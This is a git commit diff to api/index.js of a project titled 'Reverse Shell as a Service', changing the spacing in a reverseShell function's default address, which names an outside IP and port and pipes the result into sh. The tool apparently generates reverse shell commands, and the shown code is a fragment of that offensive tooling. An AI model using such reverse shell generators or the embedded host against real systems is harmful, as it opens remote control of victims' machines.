4dd41006b6c51e817c02aff56c2c4a7a658956ef
zlamma.html <yonathandoss@gmail.com>
2023-08-20 20:04:12 -0600

    Update index.js

--- api/index.js
+++ api/index.js
@@ -11,7 +11,7 @@ const usage = `# Reverse Shell as a Service
 #
 # 3. Don't be a dick`;
 
-const reverseShell = (address = '154.49.137.21:1337: | sh') => {
+const reverseShell = (address = '154.49.137.21:1337:|sh') => {
 	const [host, port, cmd] = address.split(':');
 	if (!host || !port) {
 		return usage;
